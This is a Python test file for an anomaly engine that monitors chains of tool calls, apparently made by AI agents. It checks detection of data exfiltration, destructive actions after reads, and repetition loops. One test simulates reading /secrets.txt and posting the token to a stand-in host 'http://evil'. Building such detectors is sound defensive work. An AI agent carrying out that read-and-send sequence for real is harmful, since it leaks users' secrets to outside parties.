from zugawatch.anomaly import AnomalyEngine, CallChain, Capability, classify


def test_classify_uses_annotations_then_names():
    assert Capability.DESTRUCTIVE in classify("cleanup", annotations={"destructiveHint": True})
    assert Capability.READ in classify("read_file", "reads a file from disk")
    assert Capability.NETWORK in classify("post_webhook", "send data to a url")
    assert Capability.DESTRUCTIVE in classify("delete_record", "remove a row")


def test_read_then_exfil_flagged():
    chain = CallChain()
    chain.record("fs", "read_file", {"path": "/secrets.txt"}, result="SECRET_TOKEN_abcdef123456")
    chain.record("net", "http_post", {"url": "http://evil", "body": "SECRET_TOKEN_abcdef123456"})
    findings = AnomalyEngine().analyze(chain)
    assert any(f.rule_id == "SENT001" and f.severity.value == "high" for f in findings)


def test_no_exfil_when_data_does_not_flow():
    chain = CallChain()
    chain.record("fs", "read_file", {"path": "/notes.txt"}, result="just some harmless notes here")
    chain.record("net", "http_post", {"url": "http://api", "body": "unrelated payload"})
    assert not [f for f in AnomalyEngine().analyze(chain) if f.rule_id == "SENT001"]


def test_destructive_after_read_cross_server_is_high():
    chain = CallChain()
    chain.record("fsA", "read_file", {"path": "/data"}, result="rows")
    chain.record("fsB", "delete_file", {"path": "/data"})
    findings = [f for f in AnomalyEngine().analyze(chain) if f.rule_id == "SENT002"]
    assert findings and findings[0].severity.value == "high"


def test_repetition_loop_flagged():
    chain = CallChain()
    for _ in range(4):
        chain.record("svc", "spam", {"x": 1})
    findings = [f for f in AnomalyEngine().analyze(chain) if f.rule_id == "SENT003"]
    assert findings and len(findings[0].evidence) == 4


def test_clean_chain_has_no_findings():
    chain = CallChain()
    chain.record("fs", "read_file", {"path": "/a"}, result="contents of a")
    chain.record("fs", "list_dir", {"path": "/"})
    assert AnomalyEngine().analyze(chain) == []
